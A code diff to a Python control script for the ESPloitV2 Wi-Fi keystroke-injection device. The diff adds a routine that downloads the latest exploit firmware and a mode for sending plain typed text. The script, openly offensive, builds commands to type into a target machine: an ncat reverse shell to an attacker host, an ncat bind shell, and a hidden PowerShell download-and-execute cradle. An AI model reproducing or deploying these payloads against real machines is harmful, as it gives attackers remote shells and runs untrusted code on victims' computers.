@@ -2,6 +2,8 @@
 # -*- coding: utf-8 -*-
 import requests
 import argparse
+import re
+from pathlib import Path
 from urllib.parse import urlencode, quote_plus
 
 def banner():
@@ -70,12 +72,32 @@ def send_payload(user_converted, panel):
         print("\033[91mError, couldn't reach the Wifi Portal !")
 
 
+def update_firmware():
+     update = "https://github.com/exploitagency/ESPloitV2/releases"
+     update = requests.get(update).text
+     regex = re.compile("exploit.*\.bin")
+     last = "https://github.com/" + regex.findall(update)[0]
+
+     name = "-".join(last.split('/')[-2:])
+     download = Path(name)
+     if not download.exists():
+         print("Downloading the last release: %s" % last)
+         r = requests.get(last, stream=True)
+         if r.status_code == 200:
+             with open(name, 'wb') as f:
+                 for chunk in r:
+                     f.write(chunk)
+
+
 def check_panel(panel):
     try:
         if not "ESPloit" in requests.get(panel, timeout=1).text:
             print("\033[91mError 404, are you connected on the right AP?")
+            update_firmware()
+
     except Exception as e:
         print("\033[91mError, couldn't reach the Wifi Portal !\033[0m")
+        update_firmware()
 
 
 if __name__ == "__main__":
@@ -110,11 +132,11 @@ if __name__ == "__main__":
             continue
 
         # Reverse Shell Linux
-        elif user_input == "reverse":
+        elif "reverse" == user_input :
             user_input = "bash -c 'nohup ncat %s %s -e $SHELL &'" % (results.host, results.port)
 
         # Bind Shell Linux
-        elif user_input == "bind":
+        elif "bind" == user_input:
             user_input = "bash -c 'nohup ncat -lvp %s -e $SHELL -k &'" % (results.port)
 
         # Empire or anything for Windows
@@ -123,13 +145,22 @@ if __name__ == "__main__":
             args = user_input.split(" ")
             user_input = "powershell -W Hidden -nop -noni -c \"IEX (New-Object Net.Webclient).downloadstring('%s')\"" % args[1]
 
+        # Send simple text without using a payload chain
+        elif 'send' == user_input.split(' ')[0]:
+            # Convert the simple text to keymap
+            txt = "".join(user_input.split(' ')[1:])
+            user_converted = convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176")
+            if results.verbose == True:
+                print('\033[92mText:\033[0m\n%s' % user_converted)
 
-        # Send evil payload
-        if user_input != "":
+            # Send the payload
+            send_payload(user_converted, results.panel+"/runlivepayload")
+
+        # Send evil command with default payload
+        elif user_input != "":
 
             # Convert from AZERTY to QWERTY
             user_converted = convert_to_keymap(user_input, payload)
-
             if results.verbose == True:
                 print('\033[92mPayload:\033[0m\n%s' % user_converted)
 
